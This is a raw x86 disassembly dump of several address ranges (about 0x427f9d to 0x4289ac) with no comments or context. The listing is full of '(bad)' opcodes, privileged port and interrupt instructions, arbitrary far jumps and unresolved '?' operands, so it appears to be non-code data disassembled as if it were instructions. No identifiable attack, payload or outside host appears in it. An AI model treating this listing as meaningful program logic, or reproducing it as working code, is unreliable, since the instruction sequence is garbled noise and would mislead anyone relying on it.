  427f9d:	mov    edi,0x85e029ac
  427fa2:	and    al,0x3c
  427fa4:	aam    0x65
  427fa6:	(bad)  
  427fa7:	stos   BYTE PTR es:[edi],al
  427fa8:	add    DWORD PTR [eax],eax
  427faa:	pop    es
  427fab:	add    DWORD PTR [eax],eax
  427fad:	add    ah,cl
  427faf:	das    
  427fb0:	jle    0x427fb7
  427fb2:	add    esp,DWORD PTR [edx-0x5523bbb5]
  427fb8:	mov    eax,0x5b62a30a
  427fbd:	js     0x427fdb
  427fbf:	and    edi,ebx
  427fc1:	lods   eax,DWORD PTR ds:[esi]
  427fc2:	xchg   DWORD PTR [edi-0xf],edx
  427fc5:	fmul   DWORD PTR [ecx-0x4d]
  427fc8:	adc    eax,0xbfe307f0
  427fcd:	xor    DWORD PTR [edi-0x32732bf7],0xffffffb8
  427fd4:	mov    eax,0x20b6235a
  427fd9:	jne    0x428039
  427fdb:	adc    ebp,DWORD PTR [esi-0x13]
  427fde:	gs pusha 
  427fe0:	retf   
  427fe1:	adc    cl,bl
  427fe3:	je     0x427fb7
  427fe5:	dec    ecx
  427fe6:	ret    
  427fe7:	fcmovb st,st(0)
  427fe9:	dec    ebx
  427fea:	jae    0x428023
  427fec:	ret    0x87e0
  427fef:	popf   
  427ff0:	test   ah,bl
  427ff2:	out    dx,eax
  427ff3:	scas   eax,DWORD PTR es:[edi]
  427ff4:	(bad)  
  427ff5:	mov    ds:0x439ec15f,al
  427ffa:	mov    WORD PTR [edx-0x2f2aeda5],fs
  428000:	xchg   DWORD PTR [edx+0x75],esi
  428003:	inc    eax
  428004:	ret    0xc50d
  428007:	xchg   edi,eax
  428008:	out    dx,al
  428009:	mov    dh,0x11
  42800b:	and    DWORD PTR [ebx-0x48bb5421],ebx
  428011:	sti    
  428012:	push   ss
  428013:	(bad)  
  428014:	mov    esi,0xec98d9f5
  428019:	mov    ecx,0xf296a29
  42801e:	pop    es
  42801f:	mov    ecx,0x93e8bcac
  428024:	ss xchg esi,eax
  428026:	mov    dh,0x3e
  428028:	bound  esp,QWORD PTR [edi-0x52ba620d]
  42802e:	jb     0x42803f
  428030:	mov    dh,0xb4
  428032:	in     al,0xda
  428034:	(bad)  
  428035:	inc    edx
  428036:	mov    DWORD PTR [eax],ebp
  428038:	mov    al,0xa
  42803a:	jo     0x427fc9
  42803c:	xor    ebx,ebx
  42803e:	xchg   edx,eax
  42803f:	adc    DWORD PTR [edi+0x61],0xd6f2f601
  428046:	sub    DWORD PTR [edx+edx*8],esp
  428049:	pop    eax
  42804a:	fisubr DWORD PTR [ebp+0x131d8f11]
  428050:	arpl   WORD PTR [ebx+0xfd08ad2],sp
  428056:	mov    eax,ds:0xb71de63e
  42805b:	gs in  al,dx
  42805d:	push   0xfc3933b0
  428062:	cld    
  428063:	sbb    DWORD PTR [ebx+0x3d7e5253],esi
  428069:	or     DWORD PTR [edx+0x1fc61cd5],ecx
  42806f:	adc    ecx,DWORD PTR [edx-0x5e543abf]
  428075:	es pushf 
  428077:	into   
  428078:	add    al,0xa5
  42807a:	daa    
  42807b:	ds xchg esi,eax
  42807d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42807e:	outs   dx,DWORD PTR ds:[esi]
  42807f:	dec    esp
  428080:	inc    edx
  428081:	mov    ecx,?
  428083:	mov    bl,0xe8
  428085:	std    
  428086:	dec    ecx
  428087:	cmp    al,0x94
  428089:	mov    eax,0x1ed01610
  42808e:	les    esp,FWORD PTR [edx+ebp*8+0x47]
  428092:	add    al,0xae
  428094:	imul   edi,DWORD PTR [esi-0x69],0x6f
  428098:	inc    ebp
  428099:	xchg   DWORD PTR [edi-0x1cd0152b],esi
  42809f:	pop    eax
  4280a0:	and    BYTE PTR [ebx],dl
  4280a2:	inc    ebx
  4280a3:	jb     0x4280de
  4280a5:	mov    cl,0x20
  4280a7:	nop
  4280a8:	dec    ebp
  4280a9:	test   DWORD PTR [edx-0x71e5d19a],0x314ff2e1
  4280b3:	loopne 0x428126
	...
  428115:	add    bh,bl
  428117:	out    dx,al
  428118:	std    
  428119:	dec    esp
  42811a:	std    
  42811b:	pop    edi
  42811c:	(bad)  
  42811d:	(bad)  
  42811e:	cmp    al,0x36
  428120:	cmp    esp,ebp
  428122:	mov    esp,0xced94075
  428127:	stos   DWORD PTR es:[edi],eax
  428128:	add    DWORD PTR [eax],eax
  42812a:	pop    es
  42812b:	add    DWORD PTR [eax],eax
  42812d:	add    ah,dl
  42812f:	gs sar ecx,1
  428132:	scas   al,BYTE PTR es:[edi]
  428133:	cmp    DWORD PTR [ebx+edi*4-0x53],ebx
  428137:	mov    bh,dh
  428139:	mov    bh,0xb0
  42813b:	test   ebx,eax
  42813d:	add    eax,0x4533a4a0
  428142:	mov    edx,0xd40fe502
  428147:	test   bh,dl
  428149:	test   al,0x10
  42814b:	mov    dl,0x8f
  42814d:	xchg   ecx,eax
  42814e:	shr    eax,1
  428150:	repz in eax,dx
  428152:	add    eax,0xc4572a31
  428157:	stc    
  428158:	jno    0x4280ef
  42815a:	and    al,0x25
  42815c:	xor    BYTE PTR [esi-0x54d7dd60],0x6b
  428163:	add    DWORD PTR [edi+edx*2],ebp
  428166:	repz mov ebx,0x9aabc034
  42816c:	fnstenv [ebx-0x1ecd2a]
  428172:	das    
  428173:	sbb    esp,0x699364a8
  428179:	sub    BYTE PTR [edx],ah
  42817b:	test   al,0x6d
  42817d:	or     dh,BYTE PTR [esi]
  42817f:	xor    DWORD PTR [edx+0x5efde3b1],ecx
  428185:	mov    al,ds:0x9661a545
  42818a:	aam    0x74
  42818c:	mov    DWORD PTR [ecx+0x14f53988],ebp
  428192:	mov    cl,0x35
  428194:	imul   ebp,DWORD PTR [edi+0x4d46dfc5],0x35a31871
  42819e:	push   cs
  42819f:	push   ss
  4281a0:	sar    DWORD PTR [esi],cl
  4281a2:	xor    esi,DWORD PTR [ebp-0x30016e84]
  4281a8:	fdivr  DWORD PTR [edi+ebx*1-0x51b50263]
  4281af:	jmp    0x7b4c:0x722653af
  4281b6:	aam    0xb1
  4281b8:	and    BYTE PTR [eax-0x32],cl
  4281bb:	icebp  
  4281bc:	retf   0x763d
  4281bf:	stos   DWORD PTR es:[edi],eax
  4281c0:	out    dx,al
  4281c1:	push   esi
  4281c2:	or     al,0x22
  4281c4:	cmp    ah,dl
  4281c6:	in     eax,0xb2
  4281c8:	xor    DWORD PTR [edi+eax*4+0x77],edx
  4281cc:	fwait
  4281cd:	mov    ?,ebp
  4281cf:	cmp    al,0x73
  4281d1:	mov    bh,0x59
  4281d3:	pusha  
  4281d4:	sbb    ch,BYTE PTR [ebp-0x7e9a2d9e]
  4281da:	sub    DWORD PTR [ebx-0x6b],esp
  4281dd:	aam    0x5e
  4281df:	dec    ecx
  4281e0:	jb     0x42818b
  4281e2:	retf   0x4b39
  4281e5:	push   edi
  4281e6:	ror    DWORD PTR [ecx-0x29471b72],1
  4281ec:	xor    al,0x8a
  4281ee:	xor    ch,BYTE PTR [ecx-0x48]
  4281f1:	sbb    esp,DWORD PTR [edi+edx*1]
  4281f4:	cmc    
  4281f5:	push   edi
  4281f6:	mov    dh,0x8a
  4281f8:	in     eax,0x1b
  4281fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281fb:	and    DWORD PTR [ecx],edi
  4281fd:	retf   0x225e
  428200:	div    DWORD PTR [edi-0x27ad48f2]
  428206:	(bad)  
  428207:	or     DWORD PTR [esi],ecx
  428209:	fcom   st(6)
  42820b:	dec    esi
  42820c:	fs test al,0x8c
  42820f:	xchg   esi,eax
  428210:	lds    esi,FWORD PTR [edi-0x17c96483]
  428216:	fisttp WORD PTR [esp+esi*1]
  428219:	and    eax,0x9bd62af2
  42821e:	add    BYTE PTR [edx],dl
  428220:	imul   eax,DWORD PTR [ebp+0x20],0xafa30692
  428227:	pop    edx
  428228:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428229:	cmp    eax,0xb611ad03
  42822e:	pop    eax
  42822f:	js     0x4281c6
  428231:	lds    ebp,FWORD PTR [esi]
  428233:	jbe    0x428299
	...
  428295:	add    bh,al
  428297:	fidiv  WORD PTR [esi]
  428299:	loop   0x4282da
  42829b:	jmp    0x52eb:0x1ad8ffd7
  4282a2:	scas   eax,DWORD PTR es:[edi]
  4282a3:	outs   dx,DWORD PTR ds:[esi]
  4282a4:	xchg   eax,edx
  4282a6:	aad    0xac
  4282a8:	add    DWORD PTR [eax],eax
  4282aa:	pop    es
  4282ab:	add    DWORD PTR [eax],eax
  4282ad:	add    bh,ch
  4282af:	push   esp
  4282b0:	aaa    
  4282b1:	bound  ebx,QWORD PTR [edx+0x72]
  4282b4:	mov    ch,0xe9
  4282b6:	clc    
  4282b7:	in     eax,dx
  4282b8:	mov    DWORD PTR [ebp+ebx*1-0x71],ecx
  4282bc:	sbb    BYTE PTR [ecx+esi*4-0x19],0x36
  4282c1:	mov    edi,0x3ec71aa2
  4282c6:	push   esp
  4282c7:	adc    eax,0xcf6a096b
  4282cc:	ins    DWORD PTR es:[edi],dx
  4282cd:	jecxz  0x428329
  4282cf:	push   0xffffffaa
  4282d1:	je     0x42834d
  4282d3:	adc    cl,BYTE PTR [edi]
  4282d5:	xchg   ebp,eax
  4282d6:	stos   BYTE PTR es:[edi],al
  4282d7:	xor    esp,DWORD PTR [ebp+0x11a5b001]
  4282dd:	inc    ecx
  4282de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282df:	cmp    eax,0xc27bfab0
  4282e4:	or     dh,BYTE PTR [edi+0x54]
  4282e7:	or     edx,DWORD PTR [edx+0x51b7e230]
  4282ed:	xor    DWORD PTR [edi+0x3e],eax
  4282f0:	mov    al,ds:0x8ba1b94c
  4282f5:	mov    eax,ds:0x8b365785
  4282fa:	dec    edx
  4282fb:	ds add al,0x1f
  4282fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4282ff:	mov    ds:0x8f178ad2,al
  428304:	aam    0x66
  428306:	cmp    eax,0x2bd85113
  42830b:	mov    dl,0xea
  42830d:	mov    esp,0x6932ea43
  428312:	jo     0x42835a
  428314:	ss and edi,ecx
  428317:	push   0xffffffa7
  428319:	lahf   
  42831a:	scas   al,BYTE PTR es:[edi]
  42831b:	push   edi
  42831c:	dec    esp
  42831d:	or     BYTE PTR [ebx+0x45d262cf],al
  428323:	stos   DWORD PTR es:[edi],eax
  428324:	and    al,0xb6
  428326:	scas   al,BYTE PTR es:[edi]
  428327:	inc    esi
  428328:	dec    eax
  428329:	push   edx
  42832a:	and    edx,DWORD PTR [ebp+0x6fa5e2c3]
  428330:	loop   0x4283ad
  428332:	pop    edi
  428333:	scas   al,BYTE PTR es:[edi]
  428334:	data16 js 0x4282f2
  428337:	mov    al,ds:0x25eb861c
  42833c:	std    
  42833d:	aaa    
  42833e:	mov    edx,0xb9fd48ff
  428343:	push   edx
  428344:	lahf   
  428345:	push   eax
  428346:	add    BYTE PTR [ecx+0x557019cc],0xc3
  42834d:	gs xchg ebp,eax
  42834f:	fcomp  DWORD PTR [ecx+0x23c51ef3]
  428355:	(bad)  
  428356:	sub    ch,BYTE PTR [edi+0x6eaa5b5a]
  42835c:	pop    ebp
  42835d:	inc    ebx
  42835e:	adc    DWORD PTR [eax*2+0x1326bf8f],edx
  428365:	repz xchg esi,eax
  428367:	push   0x8a73baa8
  42836c:	or     DWORD PTR [ecx+0x5cc17eae],0xffffff98
  428373:	sbb    eax,0x339f7f6d
  428378:	ret    
  428379:	lods   al,BYTE PTR ds:[esi]
  42837a:	xchg   esp,eax
  42837b:	mov    ds:0x43995a78,al
  428380:	jg     0x42834f
  428382:	and    ebp,ebp
  428384:	fild   DWORD PTR [ebx]
  428386:	push   esi
  428387:	shr    BYTE PTR [ecx+0x3c],1
  42838a:	jge    0x428409
  42838c:	dec    edx
  42838d:	test   DWORD PTR ds:0x29d4eae5,ecx
  428393:	outs   dx,DWORD PTR ds:[esi]
  428394:	cmp    esp,DWORD PTR [eax]
  428396:	hlt    
  428397:	xor    al,0xac
  428399:	in     eax,0xf3
  42839b:	jecxz  0x42834f
  42839d:	test   eax,0x3e0c259
  4283a2:	shr    DWORD PTR [esi],0x30
  4283a5:	pop    ebp
  4283a6:	dec    ebx
  4283a7:	movaps XMMWORD PTR [ebx],xmm6
  4283aa:	dec    eax
  4283ab:	sbb    ebx,edx
  4283ad:	and    BYTE PTR [ebp-0x5bd54202],ch
  4283b3:	fmul   DWORD PTR [esi+0x0]
	...
  428415:	add    BYTE PTR [esi],cl
  428417:	xchg   esp,eax
  428418:	jg     0x42847d
  42841a:	(bad)  
  42841b:	jmp    0x42843b
  42841d:	std    
  42841e:	push   ebx
  42841f:	int    0x1
  428421:	(bad)  
  428422:	mov    ebp,0xdc03f442
  428427:	lods   eax,DWORD PTR ds:[esi]
  428428:	add    DWORD PTR [eax],eax
  42842a:	pop    es
  42842b:	add    DWORD PTR [eax],eax
  42842d:	add    BYTE PTR [ebx-0x5c387fc6],cl
  428433:	jae    0x4283f9
  428435:	mov    bl,BYTE PTR [ebx]
  428437:	or     BYTE PTR [edi-0x7e],cl
  42843a:	push   es
  42843b:	stos   DWORD PTR es:[edi],eax
  42843c:	jmp    0xb970:0x41d68b9f
  428443:	sar    BYTE PTR [eax],cl
  428445:	in     al,0xf5
  428447:	ret    0xda2
  42844a:	sub    edx,DWORD PTR [edx+0x2726cf09]
  428450:	in     eax,0x9f
  428452:	dec    ebp
  428453:	popf   
  428454:	jecxz  0x428458
  428456:	icebp  
  428457:	std    
  428458:	stc    
  428459:	dec    edx
  42845a:	push   edx
  42845b:	dec    ecx
  42845c:	push   0x5da871fc
  428461:	call   0x75e:0xabdb483a
  428468:	push   cs
  428469:	scas   al,BYTE PTR es:[edi]
  42846a:	or     BYTE PTR [eax+0x5d],dl
  42846d:	out    dx,al
  42846e:	ja     0x428479
  428470:	xchg   edi,eax
  428471:	les    esi,FWORD PTR [eax]
  428473:	jae    0x4284c4
  428475:	inc    ebp
  428476:	(bad)  [eax+0xe09498]
  42847c:	hlt    
  42847d:	and    BYTE PTR [ebp-0x50],0x5a
  428481:	inc    edi
  428482:	rol    DWORD PTR [edx+0x66c62566],cl
  428488:	jmp    0x91a035c1
  42848d:	imul   esi,ecx,0xffffffb5
  428490:	in     eax,dx
  428491:	cwde   
  428492:	sub    al,0x7f
  428494:	aas    
  428495:	mov    edi,0xc8c1160
  42849a:	ret    
  42849b:	mov    ch,bl
  42849d:	(bad)  
  42849e:	out    dx,eax
  42849f:	call   0xc399b514
  4284a4:	jge    0x428428
  4284a6:	push   eax
  4284a7:	mov    ah,0xcd
  4284a9:	mov    ds:0x1898a464,al
  4284ae:	cmp    eax,0xee5b6821
  4284b3:	cmp    BYTE PTR [eax],ch
  4284b5:	data16 aaa 
  4284b7:	mov    eax,0x3de92a4b
  4284bc:	pop    ss
  4284bd:	hlt    
  4284be:	mov    DWORD PTR [esi+0x4],edx
  4284c1:	sbb    eax,0xb0fa5c24
  4284c6:	mov    bh,0x70
  4284c8:	sub    BYTE PTR [edi+0x4246ce78],dh
  4284ce:	pop    edi
  4284cf:	dec    esi
  4284d0:	dec    ebx
  4284d1:	aas    
  4284d2:	data16 ja 0x428542
  4284d5:	sub    ah,BYTE PTR [esi-0x38]
  4284d8:	scas   eax,DWORD PTR es:[edi]
  4284d9:	push   ebx
  4284da:	sbb    esp,DWORD PTR [ecx]
  4284dc:	pop    es
  4284dd:	lea    esp,[esi-0x5c]
  4284e0:	mov    dl,0x24
  4284e2:	shr    DWORD PTR [ecx+0x61],0xf3
  4284e6:	xchg   edx,eax
  4284e7:	jae    0x4284f1
  4284e9:	scas   al,BYTE PTR es:[edi]
  4284ea:	add    eax,0x23e9ae80
  4284ef:	xor    eax,0xf4fcc5b3
  4284f4:	sar    al,cl
  4284f6:	inc    esi
  4284f7:	(bad)  
  4284f8:	pusha  
  4284f9:	xchg   ecx,eax
  4284fa:	lods   al,BYTE PTR ds:[esi]
  4284fb:	loopne 0x42853b
  4284fd:	adc    esp,0xffffffba
  428500:	je     0x428499
  428502:	jp     0x428570
  428504:	sbb    eax,0xaeb6d961
  428509:	icebp  
  42850a:	out    0x5b,eax
  42850c:	inc    esp
  42850d:	mov    al,0x85
  42850f:	aad    0xc1
  428511:	adc    eax,DWORD PTR [edi+0x30900e76]
  428517:	add    dl,BYTE PTR [ecx+0x4e]
  42851a:	out    0x0,al
  42851c:	test   DWORD PTR ds:0x28c95ef6,0xdd50d8f0
  428526:	cld    
  428527:	fsubr  st,st(6)
  428529:	cmc    
  42852a:	push   ebx
  42852b:	mov    BYTE PTR [ebx-0x4872d4e9],cl
  428531:	sbb    esi,DWORD PTR [esi-0x7f]
  428534:	jl     0x428536
	...
  428596:	push   ecx
  428597:	div    BYTE PTR ds:0x5bffb73e
  42859d:	dec    ebp
  42859f:	sar    BYTE PTR [ecx-0x50],cl
  4285a2:	jo     0x428602
  4285a4:	fcmovbe st,st(2)
  4285a6:	jecxz  0x428556
  4285a8:	add    DWORD PTR [eax],eax
  4285aa:	pop    es
  4285ab:	add    DWORD PTR [eax],eax
  4285ad:	add    BYTE PTR [edx],dl
  4285af:	mov    ch,0x64
  4285b1:	adc    ebx,DWORD PTR [edx+0x5c5c7492]
  4285b7:	js     0x428631
  4285b9:	add    ch,al
  4285bb:	outs   dx,BYTE PTR ds:[esi]
  4285bc:	push   es
  4285bd:	xor    ebp,DWORD PTR [edx+0x7]
  4285c0:	sub    esi,DWORD PTR [ebx]
  4285c2:	inc    ebx
  4285c3:	mov    ebp,0x37d707fd
  4285c8:	rcr    DWORD PTR [edi],1
  4285ca:	pop    edx
  4285cb:	xor    eax,0x5c7c27ec
  4285d0:	pop    si
  4285d2:	push   esp
  4285d3:	pushf  
  4285d4:	push   ebp
  4285d5:	push   esi
  4285d6:	cld    
  4285d7:	aaa    
  4285d8:	jmp    0x4285b7
  4285da:	push   ebx
  4285db:	les    esp,FWORD PTR [eax-0x2e]
  4285de:	pop    ebx
  4285df:	dec    esi
  4285e0:	hlt    
  4285e1:	rol    DWORD PTR ds:0xff5bce2c,cl
  4285e7:	add    eax,DWORD PTR [edx-0x63]
  4285ea:	stos   BYTE PTR es:[edi],al
  4285eb:	cmp    ah,cl
  4285ed:	test   BYTE PTR [ecx+0x28ad89da],ch
  4285f3:	iret   
  4285f4:	mov    edi,0xbff8971f
  4285f9:	std    
  4285fa:	mov    bl,0x44
  4285fc:	sbb    bh,bl
  4285fe:	jnp    0x42859b
  428600:	adc    ebx,DWORD PTR [eax]
  428602:	mov    dh,0xb0
  428604:	ins    DWORD PTR es:[edi],dx
  428605:	xor    dl,dh
  428607:	mov    eax,0x591fc575
  42860c:	or     al,0xff
  42860e:	aaa    
  42860f:	xchg   ebp,eax
  428610:	hlt    
  428611:	pop    esi
  428612:	ret    0xc023
  428615:	inc    BYTE PTR [edx]
  428617:	xchg   ecx,eax
  428618:	int3   
  428619:	and    al,0x86
  42861b:	adc    ebp,ebp
  42861d:	dec    edi
  42861e:	sub    cl,cl
  428620:	pusha  
  428621:	xchg   edi,eax
  428622:	or     ebp,DWORD PTR [esi+0xab55602]
  428628:	sahf   
  428629:	out    0xb5,al
  42862b:	cmp    al,0xe0
  42862d:	ins    DWORD PTR es:[edi],dx
  42862e:	sahf   
  42862f:	inc    esp
  428630:	jmp    0xa8c802d0
  428635:	fcmovnbe st,st(2)
  428637:	pop    ebx
  428638:	push   ebx
  428639:	lods   al,BYTE PTR ds:[esi]
  42863a:	cmp    DWORD PTR [edx],edi
  42863c:	or     BYTE PTR ds:[ebx],0x45
  428640:	jg     0x4285e5
  428642:	jmp    0xf10e:0x40ae82ef
  428649:	retf   
  42864a:	repnz cld 
  42864c:	push   cs
  42864d:	sbb    BYTE PTR [eiz*2+0x550e5d3],0xb8
  428655:	pusha  
  428656:	call   0xdabe:0x43b9ec82
  42865d:	pop    ebx
  42865e:	repnz dec eax
  428660:	jp     0x42864d
  428662:	inc    ebp
  428663:	pop    edx
  428664:	push   ecx
  428665:	cmp    al,0x19
  428667:	addr16 shr al,cl
  42866a:	and    eax,0x18a9b245
  42866f:	pusha  
  428670:	outs   dx,DWORD PTR ds:[esi]
  428671:	sbb    DWORD PTR [edx+ecx*8-0x1b53627d],edi
  428678:	fcomp  QWORD PTR [ebx-0x7b]
  42867b:	fild   DWORD PTR [edx+ecx*1]
  42867e:	test   eax,0xa8953c74
  428683:	repz dec esp
  428685:	jmp    0x42865f
  428687:	mov    edx,0x81cce37d
  42868c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42868d:	mov    bl,0x79
  42868f:	scas   al,BYTE PTR es:[edi]
  428690:	inc    ecx
  428691:	jbe    0x4286be
  428693:	or     DWORD PTR [ebx-0x4339c19f],0xfa5d3f35
  42869d:	pop    ebp
  42869e:	jno    0x4286b4
  4286a0:	mov    eax,0x729d820c
  4286a5:	test   BYTE PTR [edx],bl
  4286a7:	aam    0x6a
  4286a9:	add    ah,ch
  4286ab:	stc    
  4286ac:	adc    esi,esp
  4286ae:	dec    ebp
  4286af:	inc    esi
  4286b0:	fs mov edx,0x5a456b
	...
  428716:	push   esi
  428717:	pop    ebx
  428718:	xor    al,0x78
  42871a:	cmp    eax,0x967f5e7f
  42871f:	or     bh,BYTE PTR ss:[ecx-0x7bec75a]
  428726:	jmp    0x1:0x70001af
  42872d:	add    BYTE PTR [edi],bh
  42872f:	cmp    al,al
  428731:	shl    DWORD PTR [ebx+0x67],1
  428734:	jnp    0x4287a7
  428736:	xchg   esp,eax
  428737:	loope  0x42877a
  428739:	ror    bh,cl
  42873b:	rcl    ch,cl
  42873d:	lods   al,BYTE PTR ds:[esi]
  42873e:	inc    ecx
  42873f:	sar    DWORD PTR [edx],cl
  428741:	pop    ecx
  428742:	add    DWORD PTR [esi-0x4155eb4f],edx
  428748:	mov    cl,0xfc
  42874a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42874b:	fisubr WORD PTR ds:[ecx-0x1e17fb32]
  428752:	lods   al,BYTE PTR ds:[esi]
  428753:	push   0x89dad2e4
  428758:	clc    
  428759:	sbb    ch,BYTE PTR [ebx]
  42875b:	and    DWORD PTR [ebp+edx*8-0x3b],edi
  42875f:	or     DWORD PTR [ebx],0x4
  428762:	jl     0x4287b0
  428764:	adc    DWORD PTR [edx+0x4f4ff368],esi
  42876a:	imul   edx,ecx,0xffffff81
  42876d:	mov    ds:0x10cc9356,al
  428772:	pop    ebx
  428773:	retf   
  428774:	xor    BYTE PTR [ebp-0x1a1e2362],dh
  42877a:	cmc    
  42877b:	mov    cl,0x22
  42877d:	xor    cl,BYTE PTR [ebp+0x69]
  428780:	scas   al,BYTE PTR es:[edi]
  428781:	scas   al,BYTE PTR es:[edi]
  428782:	repz mov gs,WORD PTR [ebx+0x66]
  428786:	fild   DWORD PTR fs:[ecx-0x420586d4]
  42878d:	lahf   
  42878e:	xchg   ebp,eax
  42878f:	lock loopne 0x4287fd
  428792:	outs   dx,BYTE PTR ds:[esi]
  428793:	cmp    eax,DWORD PTR [ebp-0x646a0f71]
  428799:	lods   eax,DWORD PTR ds:[esi]
  42879a:	mov    WORD PTR [ebx],es
  42879c:	jmp    0x4287b1
  42879e:	mov    ecx,0xb7c54a6e
  4287a3:	add    edi,DWORD PTR ds:0xd13014db
  4287a9:	mov    esi,ecx
  4287ab:	pusha  
  4287ac:	xchg   DWORD PTR [eax-0x1d],edi
  4287af:	xor    edx,DWORD PTR [eax-0x4c35de75]
  4287b5:	push   esp
  4287b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4287b7:	scas   eax,DWORD PTR es:[edi]
  4287b8:	in     eax,0x9c
  4287ba:	loope  0x4287f3
  4287bc:	jb     0x428787
  4287be:	fistp  DWORD PTR [esi]
  4287c0:	cmp    esi,esi
  4287c2:	mov    ds:0x41651d99,al
  4287c7:	pop    es
  4287c8:	cmp    DWORD PTR [edi-0x53],esi
  4287cb:	and    edi,DWORD PTR [esp+eax*8+0x5e6f7e81]
  4287d2:	int    0xf3
  4287d4:	xchg   ebp,eax
  4287d5:	fimul  WORD PTR [esi]
  4287d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4287d8:	inc    edi
  4287d9:	cmp    edx,edi
  4287db:	aas    
  4287dc:	xchg   ch,cl
  4287de:	dec    ecx
  4287df:	add    bh,BYTE PTR [edi+0x701c1e8d]
  4287e5:	out    0x14,al
  4287e7:	sub    BYTE PTR [eax],0x89
  4287ea:	ret    0xca19
  4287ed:	pop    esi
  4287ee:	fs ins DWORD PTR es:[edi],dx
  4287f0:	in     eax,0x73
  4287f2:	and    al,0x44
  4287f4:	ja     0x4287b1
  4287f6:	dec    esp
  4287f7:	sub    BYTE PTR [ecx+0x57],bh
  4287fa:	pushf  
  4287fb:	jmp    0x6999:0x29cfee32
  428802:	(bad)  
  428803:	and    BYTE PTR [ebp+0x40],al
  428806:	inc    ecx
  428807:	sbb    DWORD PTR [ebx+eax*4-0x27b29f7d],ebx
  42880e:	adc    eax,DWORD PTR [ebp+0x4]
  428811:	fs (bad) 
  428813:	push   0xffffffc8
  428815:	mov    edx,0x6c2a376a
  42881a:	dec    ebp
  42881b:	xchg   BYTE PTR [edi-0x7cd73b4d],dh
  428821:	xor    BYTE PTR ds:0x46d6ba4a,0x3d
  428828:	(bad)  
  42882a:	xchg   edx,eax
  42882b:	jo     0x4287ca
  42882d:	inc    ebx
  42882e:	test   DWORD PTR [ecx],esp
  428830:	stos   DWORD PTR es:[edi],eax
  428831:	mov    ecx,0x6423ab
	...
  428896:	es jp  0x42890a
  428899:	les    edi,FWORD PTR [ebp-0x31]
  42889c:	mov    bh,0xfa
  42889e:	ret    
  42889f:	ja     0x428848
  4288a1:	test   DWORD PTR [edx-0x51],ebp
  4288a4:	push   edi
  4288a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4288a6:	icebp  
  4288a7:	mov    al,0x1
  4288a9:	add    BYTE PTR [edi],al
  4288ab:	add    DWORD PTR [eax],eax
  4288ad:	add    BYTE PTR [edi+0x615f40bd],al
  4288b3:	mov    dh,0x1e
  4288b5:	adc    edx,DWORD PTR [edx+0x206d390f]
  4288bb:	ss mov ecx,0x8ca05c80
  4288c1:	xchg   ebp,eax
  4288c2:	add    al,0x48
  4288c4:	sub    esi,DWORD PTR [bx+di]
  4288c7:	lock loope 0x4288c2
  4288ca:	sub    DWORD PTR [eax-0x4cc12755],0xffffffa8
  4288d1:	xchg   esi,eax
  4288d2:	stos   BYTE PTR es:[edi],al
  4288d3:	fild   QWORD PTR [ebx]
  4288d5:	cmp    edx,DWORD PTR [ecx]
  4288d7:	test   eax,0xa7728202
  4288dc:	cmp    ecx,DWORD PTR [eax-0xd6704e7]
  4288e2:	xor    edx,DWORD PTR [ebp-0x7f]
  4288e5:	pop    ds
  4288e6:	in     al,dx
  4288e7:	xor    al,BYTE PTR [esi-0x58c175b0]
  4288ed:	jmp    0x428926
  4288ef:	sbb    eax,0xdb048222
  4288f4:	inc    ebp
  4288f5:	outs   dx,DWORD PTR ds:[esi]
  4288f6:	out    0x2f,al
  4288f8:	das    
  4288f9:	adc    DWORD PTR [esi-0x6ccb598a],edi
  4288ff:	mov    bl,0xc8
  428901:	dec    edi
  428902:	jbe    0x42894f
  428904:	loop   0x428921
  428906:	into   
  428907:	sti    
  428908:	cld    
  428909:	ficom  DWORD PTR [ecx]
  42890b:	sub    BYTE PTR [esi-0x693233ca],al
  428911:	sti    
  428912:	out    dx,eax
  428913:	or     al,0xee
  428915:	mov    esp,0x6bafd8d8
  42891a:	pop    ebx
  42891b:	xchg   ecx,eax
  42891c:	inc    esp
  42891d:	adc    esp,DWORD PTR [eax+0x14]
  428920:	mov    al,ds:0x73090b47
  428925:	add    eax,0xa8b752fa
  42892a:	loope  0x42893c
  42892c:	das    
  42892d:	pop    edi
  42892e:	cmp    DWORD PTR [ebx+0x3ac14b64],ebx
  428934:	adc    ebp,ecx
  428936:	pop    edx
  428937:	mov    edi,ds
  428939:	(bad)  
  42893a:	nop
  42893b:	std    
  42893c:	and    al,0x9d
  42893e:	add    eax,DWORD PTR [ebx-0x3137bcf7]
  428944:	adc    edi,DWORD PTR [edi+0x26e9719d]
  42894a:	lods   al,BYTE PTR ds:[esi]
  42894b:	in     eax,dx
  42894c:	in     eax,0x5
  42894e:	js     0x42898a
  428950:	cmp    BYTE PTR [eax-0x57aabc6a],al
  428956:	retf   0xcfc6
  428959:	sbb    al,0x70
  42895b:	mov    al,0x68
  42895d:	in     al,0x4c
  42895f:	(bad)
  428962:	sub    dh,dl
  428964:	add    BYTE PTR ss:[ecx],dl
  428967:	imul   esp,DWORD PTR [ebx-0x4a],0xb23a7947
  42896e:	mov    edi,0xc8aa097c
  428973:	outs   dx,BYTE PTR ds:[esi]
  428974:	and    dh,dh
  428976:	sbb    ecx,0x79a9d32e
  42897c:	sub    al,0xc2
  42897e:	mov    ebp,0x9ca39e9d
  428983:	out    0xa7,eax
  428985:	jne    0x428997
  428987:	xchg   esp,eax
  428988:	shl    ah,cl
  42898a:	mov    ebp,eax
  42898c:	jae    0x4289ab
  42898e:	outs   dx,BYTE PTR ds:[esi]
  42898f:	lock sub al,0x1d
  428992:	aam    0xf6
  428994:	out    0x3e,al
  428996:	add    dh,bh
  428998:	sub    cl,BYTE PTR [esi]
  42899a:	push   eax
  42899b:	add    bl,BYTE PTR es:[eax+ebp*1+0x12]
  4289a0:	xchg   BYTE PTR [eax],al
  4289a2:	and    ecx,DWORD PTR [esi-0x26]
  4289a5:	dec    esi
  4289a6:	cmp    bl,BYTE PTR [ebp-0x6df41f8b]
  4289ac:	push   es
